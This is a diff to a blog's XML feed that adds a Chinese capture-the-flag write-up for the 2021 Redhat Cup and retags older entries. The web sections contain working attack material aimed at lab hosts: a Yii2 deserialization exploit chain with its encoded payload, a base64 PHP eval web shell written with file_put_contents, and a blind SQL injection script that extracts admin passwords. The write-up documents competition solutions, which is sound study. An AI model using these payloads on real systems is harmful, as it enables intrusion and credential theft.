@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>2021红帽杯WP</title>
+      <link href="2021/05/11/2021%E7%BA%A2%E5%B8%BD%E6%9D%AFWP/"/>
+      <url>2021/05/11/2021%E7%BA%A2%E5%B8%BD%E6%9D%AFWP/</url>
+      
+        <content type="html"><![CDATA[<h2 id="MISC-签到"><a href="#MISC-签到" class="headerlink" title="[MISC]签到"></a>[MISC]签到</h2><p><a href="http://www.longpelaexpertise.com.au/toolsCode.php">http://www.longpelaexpertise.com.au/toolsCode.php</a></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210509102244837.png" alt="image-20210509102244837"></p><h2 id="WEB-find-it"><a href="#WEB-find-it" class="headerlink" title="[WEB]find it"></a>[WEB]find it</h2><p><code>robots.txt</code></p><p><code>.1ndexx.php.swp</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $link &#x3D; mysql_connect(&#39;localhost&#39;, &#39;root&#39;); ?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line"> &lt;title&gt;Hello worldd!&lt;&#x2F;title&gt;</span><br><span class="line"> &lt;style&gt;</span><br><span class="line"> body &#123;</span><br><span class="line">  background-color: white;</span><br><span class="line">  text-align: center;</span><br><span class="line">  padding: 50px;</span><br><span class="line">  font-family: &quot;Open Sans&quot;,&quot;Helvetica Neue&quot;,Helvetica,Arial,sans-serif;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> #logo &#123;</span><br><span class="line">  margin-bottom: 40px;</span><br><span class="line"> &#125;</span><br><span class="line"> &lt;yle&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"> &lt; img id&#x3D;&quot;logo&quot; src&#x3D;&quot;logo.png&quot; &#x2F;&gt;</span><br><span class="line"> &lt;h1&gt;&lt;?php echo &quot;Hello My freind!&quot;; ?&gt;&lt;&#x2F;h1&gt;</span><br><span class="line"> &lt;?php if($link) &#123; ?&gt;</span><br><span class="line">  &lt;h2&gt;I Can&#39;t view my php files?!&lt;&#x2F;h2&gt;</span><br><span class="line"> &lt;?php &#125; else &#123; ?&gt;</span><br><span class="line">  &lt;h2&gt;MySQL Server version: &lt;?php echo mysql_get_server_info(); ?&gt;&lt;&#x2F;h2&gt;</span><br><span class="line"> &lt;?php &#125; ?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;ml&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">#Really easy...</span><br><span class="line"></span><br><span class="line">$file&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;) or die(&quot;Unable 2 open!&quot;);</span><br><span class="line"></span><br><span class="line">$I_know_you_wanna_but_i_will_not_give_you_hhh &#x3D; fread($file,filesize(&quot;flag.php&quot;));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$hack&#x3D;fopen(&quot;hack.php&quot;,&quot;w&quot;) or die(&quot;Unable 2 open&quot;);</span><br><span class="line"></span><br><span class="line">$a&#x3D;$_GET[&#39;code&#39;];</span><br><span class="line"></span><br><span class="line">if(preg_match(&#39;&#x2F;system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\&#96;|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump&#x2F;&#39;,$a))&#123;</span><br><span class="line"> die(&quot;you die&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(strlen($a)&gt;33)&#123;</span><br><span class="line"> die(&quot;nonono.&quot;);</span><br><span class="line">&#125;</span><br><span class="line">fwrite($hack,$a);</span><br><span class="line">fwrite($hack,$I_know_you_wanna_but_i_will_not_give_you_hhh);</span><br><span class="line"></span><br><span class="line">fclose($file);</span><br><span class="line">fclose($hack);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>直接写入phpinfo：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;eci-2zeab1jn4vnk02hulykm.cloudeci1.ichunqiu.com&#x2F;1ndexx.php?code&#x3D;&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p>然后访问hack.php：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;eci-2zeab1jn4vnk02hulykm.cloudeci1.ichunqiu.com&#x2F;hack.php</span><br></pre></td></tr></table></figure><p>PHPINFO页面 找到flag</p><h2 id="WEB-framework"><a href="#WEB-framework" class="headerlink" title="[WEB]framework"></a>[WEB]framework</h2><p>存在WWW.ZIP源码泄露</p><p><a href="https://www.anquanke.com/post/id/217930">https://www.anquanke.com/post/id/217930</a></p><p>三条链子都可以用。看下phpinfo：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">// 这里需要改为isRunning</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;render&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">See</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$description</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;description = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>\<span class="title">See</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Swift_KeyCache_DiskKeyCache</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$keys</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$path</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;path = <span class="keyword">new</span> See;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;keys = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;axin&quot;</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;is&quot;</span>=&gt;<span class="string">&quot;handsome&quot;</span>)</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 生成poc</span></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Swift_KeyCache_DiskKeyCache()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;eci-2ze8j3xqhbs4r48k0oky.cloudeci1.ichunqiu.com&#x2F;index.php?r&#x3D;site%2Fabout&amp;message&#x3D;TzoyNzoiU3dpZnRfS2V5Q2FjaGVfRGlza0tleUNhY2hlIjoyOntzOjMzOiIAU3dpZnRfS2V5Q2FjaGVfRGlza0tleUNhY2hlAGtleXMiO2E6MTp7czo0OiJheGluIjthOjE6e3M6MjoiaXMiO3M6ODoiaGFuZHNvbWUiO319czozMzoiAFN3aWZ0X0tleUNhY2hlX0Rpc2tLZXlDYWNoZQBwYXRoIjtPOjQyOiJwaHBEb2N1bWVudG9yXFJlZmxlY3Rpb25cRG9jQmxvY2tcVGFnc1xTZWUiOjE6e3M6MTQ6IgAqAGRlc2NyaXB0aW9uIjtPOjE1OiJGYWtlclxHZW5lcmF0b3IiOjE6e3M6MTM6IgAqAGZvcm1hdHRlcnMiO2E6MTp7czo2OiJyZW5kZXIiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NjoiYXNzZXJ0IjtzOjI6ImlkIjtzOjEwOiJwaHBpbmZvKCk7Ijt9aToxO3M6MzoicnVuIjt9fX19fQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>可以看phpinfo 关键是绕过:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl,mail,putenv,error_log,error_reporting,unset,unlink,return</span><br></pre></td></tr></table></figure><p>参考：<a href="https://www.anquanke.com/post/id/170681">https://www.anquanke.com/post/id/170681</a></p><p>写shell绕过：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;file_put_contents(&quot;v.php&quot;, base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1Rbdl0pOz8+&quot;));&#x27;</span>;&#125;</span><br></pre></td></tr></table></figure><p>蚁剑连接：绕过disable functions</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210509154116325.png" alt="image-20210509154116325"></p><h2 id="WEB-WebsiteManger"><a href="#WEB-WebsiteManger" class="headerlink" title="[WEB]WebsiteManger"></a>[WEB]WebsiteManger</h2><p>登陆页面，图片存在注入，注入得到用户名、密码 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">req = requests.session()</span><br><span class="line">string = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span>;</span><br><span class="line"></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>,<span class="number">50</span>):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> string:</span><br><span class="line">    url = <span class="string">&quot;http://eci-2zeebn8ci69dx3qyic2l.cloudeci1.ichunqiu.com/image.php?id=&quot;</span></span><br><span class="line">    payload = <span class="string">&quot;if(ascii(substr((select/**/group_concat(password)from(users)),%d,1))=(%s),1,0)&quot;</span>%(i,<span class="built_in">ord</span>(j))</span><br><span class="line">    r = req.get(url+payload)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;JFIF&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">      res += j</span><br><span class="line">      <span class="built_in">print</span>(res)</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line"><span class="comment">#admin</span></span><br><span class="line"><span class="comment">#05b0176855ad7f3e7d9ac</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>登陆后 file协议读取flag即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;flag</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210509142022116.png" alt="image-20210509142022116"></p><h2 id="WEB-ezlight"><a href="#WEB-ezlight" class="headerlink" title="[WEB]ezlight"></a>[WEB]ezlight</h2><p>0day– gml yyds</p><h2 id="Crypto-primegame"><a href="#Crypto-primegame" class="headerlink" title="[Crypto]primegame"></a>[Crypto]primegame</h2><p><a href="http://www.secmem.org/blog/2020/09/20/poka-science-war-hacking/">http://www.secmem.org/blog/2020/09/20/poka-science-war-hacking/</a></p><h2 id="Crypto-hpcurve"><a href="#Crypto-hpcurve" class="headerlink" title="[Crypto]hpcurve"></a>[Crypto]hpcurve</h2><p><a href="https://jsur.in/posts/2020-12-21-hxp-ctf-2020-hyper-writeup">https://jsur.in/posts/2020-12-21-hxp-ctf-2020-hyper-writeup</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> ctf </tag>
+            
+            <tag> Writeup </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>第五届蓝帽杯-one_Pointer_php复现</title>
       <link href="2021/05/03/%E7%AC%AC%E4%BA%94%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF-one_Pointer_php%E5%A4%8D%E7%8E%B0/"/>
       <url>2021/05/03/%E7%AC%AC%E4%BA%94%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF-one_Pointer_php%E5%A4%8D%E7%8E%B0/</url>
@@ -13,16 +40,16 @@
       
       <categories>
           
-          <category> Writeup </category>
+          <category> CTF </category>
           
       </categories>
       
       
         <tags>
             
-            <tag> Writeup </tag>
-            
             <tag> ctf </tag>
+            
+            <tag> Writeup </tag>
             
         </tags>
       
@@ -40,16 +67,16 @@
       
       <categories>
           
-          <category> Writeup </category>
+          <category> CTF </category>
           
       </categories>
       
       
         <tags>
             
-            <tag> buuctf </tag>
-            
             <tag> Writeup </tag>
+            
+            <tag> buuctf </tag>
             
         </tags>
       
@@ -67,16 +94,16 @@
       
       <categories>
           
-          <category> Writeup </category>
+          <category> CTF </category>
           
       </categories>
       
       
         <tags>
             
-            <tag> buuctf </tag>
-            
             <tag> Writeup </tag>
+            
+            <tag> buuctf </tag>
             
         </tags>
       
@@ -94,16 +121,16 @@
       
       <categories>
           
-          <category> Writeup </category>
+          <category> CTF </category>
           
       </categories>
       
       
         <tags>
             
-            <tag> buuctf </tag>
-            
             <tag> Writeup </tag>
+            
+            <tag> buuctf </tag>
             
         </tags>
       
